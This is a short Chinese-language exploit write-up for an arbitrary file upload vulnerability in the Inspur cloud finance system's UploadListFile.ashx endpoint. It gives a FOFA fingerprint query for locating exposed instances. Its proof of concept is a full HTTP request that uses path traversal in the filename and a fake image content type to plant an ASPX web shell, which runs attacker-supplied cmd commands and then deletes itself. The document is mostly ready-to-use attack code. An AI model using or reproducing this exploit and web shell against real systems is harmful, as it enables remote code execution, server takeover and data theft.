# 浪潮云财务系统UploadListFile存在任意文件上传漏洞

浪潮云财务系统UploadListFile存在任意文件上传漏洞，允许攻击者上传恶意文件到服务器，可能导致远程代码执行、网站篡改或其他形式的攻击，严重威胁系统和数据安全。

## fofa

```javascript
body="/cwbase/web/scripts/jquery.js" || icon_hash="-1341069524"
```

## poc

```javascript
POST /cwbase/EP/ListContent/UploadListFile.ashx?uptype=attslib&keyid=1&key1=1&key2=1 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: /
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: close
Content-Type: multipart/form-data; boundary=---------------------------rww5upkbw6ctf0tu5hye
 
-----------------------------rww5upkbw6ctf0tu5hye
Content-Disposition: form-data; name="file"; filename="../../../../../../rce.aspx"
Content-Type: image/png
 
<%@ Page Language="Jscript" validateRequest="false" %>
<%
var c=new System.Diagnostics.ProcessStartInfo("cmd");
var e=new System.Diagnostics.Process();
var out:System.IO.StreamReader,EI:System.IO.StreamReader;
c.UseShellExecute=false;
c.RedirectStandardOutput=true;
c.RedirectStandardError=true;
e.StartInfo=c;
c.Arguments="/c " + Request.Item["cmd"];
e.Start();
out=e.StandardOutput;
EI=e.StandardError;
e.Close();
Response.Write(out.ReadToEnd() + EI.ReadToEnd());
System.IO.File.Delete(Request.PhysicalPath);
Response.End();%>
-----------------------------rww5upkbw6ctf0tu5hye--
```

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202408312352567.png)